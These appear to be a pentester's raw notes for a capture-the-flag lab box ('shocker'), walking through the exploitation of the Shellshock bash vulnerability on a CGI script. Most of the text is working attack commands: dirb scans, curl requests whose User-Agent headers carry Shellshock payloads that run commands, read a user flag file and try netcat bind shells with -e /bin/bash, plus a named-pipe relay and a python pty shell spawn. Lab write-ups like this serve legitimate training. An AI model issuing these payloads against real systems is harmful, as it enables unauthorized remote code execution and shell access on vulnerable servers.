# first scan
dirb http://10.10.10.56 /usr/share/dirbuster/directory-list-2.3-medium.txt

# this finds us nothing good, except /cgi-bin, so let's do a 
# more specific scan
dirb http://10.10.10.56/cgi-bin /usr/share/dirb/wordlists/common.txt -X ".sh" > dirb-report

# this finds user.sh
# let's have a look
curl 10.10.10.56/cgi-bin/user.sh

# shock is a reference to the bash shell shock vuln

# let's find out who we are

curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/which whoa
mi' 10.10.10.56/cgi-bin/user.sh
-> /usr/bin/whoami

[21:34:50] ~/D/d/S/h/h/shocker (master ⚡)
curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /usr/bin/whoami
' 10.10.10.56/cgi-bin/user.sh
-> shelly

# so we have user access

curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/which nc' 10.10.10.56/cgi-bin/user.sh
-> /bin/nc

# so now we know where nc is at (mine is at /usr/bin/nc, that's why it didn't work before)
curl -A '() { :;} echo "Content-Type: text/plain"; echo; /bin/nc -lvvp 4546 -e /bin/bash' 10.10.10.56/cgi-bin/user.sh

# let's pwn the user first
curl -A '() { :;} echo "Content-Type: text/plain"; echo; /bin/cat /home/shelly/user.txt' 10.10.10.56/cgi-bin/user.sh

# huh, nothings working
# let's debug


λ curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/nc -l localhost -p 10000 -e /bin/bash >> /tmp/logfoo 2>&1' 10.10.10.56/cgi-bin/user.s
h
λ curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/cat /tmp/logfoo' 10.10.10.56/cgi-bin/user.sh
/bin/nc: invalid option -- 'e'
This is nc from the netcat-openbsd package. An alternative nc is available
in the netcat-traditional package.
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
          [-P proxy_username] [-p source_port] [-q seconds] [-s source]
          [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
          [-x proxy_address[:port]] [destination] [port]

# okay, seems that openbsd netcat doesn't provide -e
# let's use relaying: https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem
λ curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/mknod /tmp/foomypipe p' 10.10.10.56/cgi-bin/user.sh

# nothing worked
# let's fall back to metasploit
# …

# get bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

